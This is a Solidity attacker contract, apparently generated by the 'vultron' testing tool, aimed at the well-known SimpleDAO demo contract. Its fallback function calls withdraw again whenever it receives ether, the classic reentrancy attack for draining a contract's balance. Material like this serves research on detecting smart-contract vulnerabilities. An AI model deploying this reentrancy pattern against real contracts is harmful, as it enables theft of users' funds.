pragma solidity ^0.4.19;

import "/home/hjwang/Tools/vultron/contracts/SimpleDAO.sol";

contract Attack_SimpleDAO0 {

  SimpleDAO public target_contract;

  function Attack_SimpleDAO0(address _targetContract) public payable {
      target_contract = SimpleDAO(_targetContract);
  } 

  function vultron_withdraw(uint256 amount) public {
    target_contract.withdraw(amount);
  } 

  function vultron_withdrawAll() public {
    target_contract.withdrawAll();
  } 

  function vultron_donate(uint256 vultron_amount, address to) public payable{
    target_contract.donate.value(vultron_amount)(to);
  } 

      function() public payable {
        
        target_contract.withdraw(10000);
      }
      } 
